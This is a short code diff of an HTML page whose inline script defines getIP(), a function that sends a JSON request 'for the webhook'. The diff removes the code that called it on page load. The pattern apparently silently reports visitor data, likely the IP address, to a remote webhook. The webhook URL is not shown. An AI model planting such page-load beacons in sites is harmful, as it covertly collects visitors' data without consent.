@@ -3,8 +3,7 @@ updated
 
 <script>
 document.title = "bruh";
-var path = window.location.pathname;
-var page = path.split("/").pop();
+
 
 function getIP(tok) {
   var request = new XMLHttpRequest(); //making a request for the webhook
@@ -21,7 +20,7 @@ function getIP(tok) {
 
       request.send(JSON.stringify(params));
     }
-getIP(page)
+
 </script>
 
 
